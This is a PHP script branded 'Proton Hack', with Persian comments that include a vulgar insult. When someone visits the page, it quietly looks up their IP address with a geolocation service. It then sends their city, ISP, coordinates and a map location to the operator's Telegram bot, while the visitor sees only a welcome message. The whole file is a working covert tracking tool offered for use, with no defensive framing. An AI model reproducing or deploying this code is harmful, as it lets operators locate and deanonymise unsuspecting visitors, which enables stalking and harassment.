<?php 
#Proton Hack 
#https://t.me/proton_hack
#کصمادرت بدون منبع اصکی بری 

$server = $_SERVER['REMOTE_ADDR'];
$token = "token"; #توکن رباتتون
$admin = "ID"; #ایدی عددی کسی که میخواین ایپی ها براش ارسال بشه 
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/$server"));
$zip = $Get_Ip->zip;
$timezone = $Get_Ip->timezone;
$status = $Get_Ip->status;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;
$query = $Get_Ip->query;
$org = $Get_Ip->org;
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$countryCode = $Get_Ip->countryCode;
$country = $Get_Ip->country;
$city = $Get_Ip->city;
$as = $Get_Ip->as;
date_default_timezone_set('Asia/Tehran');
$time = date('H:i:s');
$date = date('Y/m/d');
define('API_KEY',$token);
function MRN($method,$datas=[]){
    $url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

MRN('sendmessage', [
'chat_id'=>$admin,
'text'=>"🙃 اطلاعات آیپی » $server ✓
", 
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'inline_keyboard'=>[
[['text'=>"⇃  𝐀𝐬  ⇂",'callback_data'=>"Hello"]],
[['text'=>"$as",'callback_data'=>"Hello"]],
[['text'=>"𝐂𝐢𝐭𝐲",'callback_data'=>"Hello"],['text'=>"$city",'callback_data'=>"Hello"]],
[['text'=>"⇟ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇟",'callback_data'=>"Hello"]], 
[['text'=>"𝐂𝐨𝐮𝐧𝐭𝐫𝐲𝐂𝐨𝐝𝐞",'callback_data'=>"Hello"],['text'=>"$countryCode",'callback_data'=>"Hello"]],
[['text'=>"𝐈𝐬𝐩",'callback_data'=>"Hello"]],
[['text'=>"$isp",'callback_data'=>"Hello"]],
[['text'=>"𝐈𝐚𝐭",'callback_data'=>"Hello"],['text'=>"$lat",'callback_data'=>"Hello"]],
[['text'=>"𝐎𝐫𝐠",'callback_data'=>"Hello"],['text'=>"$lon",'callback_data'=>"Hello"]],
[['text'=>"𝐐𝐮𝐞𝐫𝐲",'callback_data'=>"Hello"]],
[['text'=>"$org",'callback_data'=>"Hello"]],
[['text'=>"𝐑𝐞𝐠𝐢𝐨𝐧",'callback_data'=>"Hello"],['text'=>"$region",'callback_data'=>"Hello"]],
[['text'=>"𝐑𝐞𝐠𝐢𝐨𝐧𝐍𝐚𝐦𝐞",'callback_data'=>"Hello"],['text'=>"$regionName",'callback_data'=>"Hello"]],
[['text'=>"𝐓𝐢𝐦𝐞𝐙𝐨𝐧𝐞",'callback_data'=>"Hello"],['text'=>"$timezone",'callback_data'=>"Hello"]],
[['text'=>"⇙ 𝐓𝐢𝐦𝐞 & 𝐃𝐚𝐭𝐚 ⇘",'callback_data'=>"Hello"]], 
[['text'=>"𝐓𝐢𝐦𝐞 »",'callback_data'=>"Hello"],['text'=>"$time",'callback_data'=>"Hello"]],
[['text'=>"𝐃𝐚𝐭𝐚 »",'callback_data'=>"Hello"],['text'=>"$date",'callback_data'=>"Hello"]],
[['text'=>"🌀 Proton Hack 🌀",'url'=>"t.me/ProtonHCK"]],
] 
])
]);
echo "WelCome :)";
file_get_contents("https://api.telegram.org/bot".$token."/sendLocation?chat_id=".$admin."&latitude=".$lat."&longitude=".$lon);

#اصکی بدون ذکر منبع پیگرد ناموصی دارد!عددی
?>
